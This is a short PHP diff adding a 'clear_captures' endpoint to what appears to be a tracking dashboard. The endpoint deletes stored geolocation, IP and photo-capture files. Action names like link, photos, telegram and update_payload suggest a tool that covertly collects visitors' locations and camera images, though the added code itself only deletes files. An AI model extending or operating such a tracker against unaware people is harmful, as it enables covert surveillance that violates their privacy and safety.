@@ -7,7 +7,7 @@
 declare(strict_types=1);
 
 $action = $_GET['action'] ?? '';
-$authActions = ['start', 'stop', 'link', 'captures', 'photos', 'delete_photos', 'status', 'terminal', 'telegram', 'update_payload', 'diag'];
+$authActions = ['start', 'stop', 'link', 'captures', 'photos', 'delete_photos', 'clear_captures', 'status', 'terminal', 'telegram', 'update_payload', 'diag'];
 
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     header('Content-Type: application/json');
@@ -57,6 +57,9 @@ switch ($action) {
         break;
     case 'delete_photos':
         handleDeletePhotos();
+        break;
+    case 'clear_captures':
+        handleClearCaptures();
         break;
     case 'status':
         handleStatus();
@@ -717,6 +720,41 @@ function handleDeletePhotos(): void
         'status' => 'success',
         'deleted' => $deleted,
         'failed' => $failed,
+    ]);
+}
+
+function handleClearCaptures(): void
+{
+    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+        echo json_encode(['status' => 'error', 'message' => 'POST required']);
+        return;
+    }
+
+    $uid = dashboard_session_user_id();
+    $dir = trackify_user_capture_dir($uid);
+
+    $files = [
+        $dir . '/geolocations.json',
+        $dir . '/saved.ip.txt',
+        $dir . '/location_notify.txt',
+        $dir . '/ip_pending.txt',
+        $dir . '/photo_pending.flag',
+    ];
+
+    $cleared = 0;
+    foreach ($files as $file) {
+        if (!file_exists($file)) {
+            continue;
+        }
+        if (@unlink($file)) {
+            $cleared++;
+        }
+    }
+
+    echo json_encode([
+        'status' => 'success',
+        'message' => 'Capture history cleared',
+        'cleared' => $cleared,
     ]);
 }
 
